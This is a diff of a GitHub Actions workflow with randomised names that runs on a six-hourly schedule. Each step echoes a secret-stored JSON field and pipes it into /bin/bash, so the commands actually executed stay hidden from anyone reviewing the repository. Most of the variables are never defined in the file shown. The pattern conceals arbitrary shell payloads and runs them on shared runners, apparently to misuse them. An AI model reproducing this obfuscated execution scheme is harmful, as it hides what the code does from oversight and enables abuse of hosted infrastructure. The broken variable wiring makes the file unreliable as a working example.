@@ -1,35 +1,26 @@
 name: tonghugjiga
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 5/6 * * *'
+    - cron: '45 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: tonghugjiga
         env:
-          ins7778: ${{ secrets.ins7778 }}
+          ipggv50688: ${{ secrets.ipggv50688 }}
         run: |
-          echo $ins7778 | jq -r .shc9 | /bin/bash
-          echo $nk7794 | jq -r .wbc11000 | /bin/bash
-          echo $xww750 | jq -r .p7438 | /bin/bash
-          echo $kuue88 | jq -r .tvn10 | /bin/bash
-          echo $px09 | jq -r .itrpc340 | /bin/bash
-          echo $pt0 | jq -r .t47 | /bin/bash
-          echo $azvql81 | jq -r .imxuz3895 | /bin/bash
-          echo $zsg125 | jq -r .v783 | /bin/bash
-          echo $zjw92 | jq -r .qpd884 | /bin/bash
-          echo $rvtdo0 | jq -r .bl90010 | /bin/bash
-          echo $q17 | jq -r .txn2592 | /bin/bash
-          echo $hrgb5079 | jq -r .mx6 | /bin/bash
-          echo $cznn7513 | jq -r .kqm7487 | /bin/bash
-          echo $liqew99 | jq -r .zfcic739 | /bin/bash
-          echo $p305 | jq -r .sbfsv115 | /bin/bash
-          echo $d023 | jq -r .uo617 | /bin/bash
-          echo $okk10 | jq -r .gwusi98 | /bin/bash
-          echo $iyoc05308 | jq -r .fjjv360 | /bin/bash
-          echo $w56093 | jq -r .ebot44 | /bin/bash
+          echo $ipggv50688 | jq -r .tynj417 | /bin/bash
+          echo $j36 | jq -r .kobmf23 | /bin/bash
+          echo $v64 | jq -r .g97419 | /bin/bash
+          echo $cttu645 | jq -r .rdfc41159 | /bin/bash
+          echo $so52 | jq -r .p8 | /bin/bash
+          echo $c123 | jq -r .xy0258 | /bin/bash
+          echo $awan079 | jq -r .gppu26153 | /bin/bash
+          echo $ewwwc17999 | jq -r .l29 | /bin/bash
 
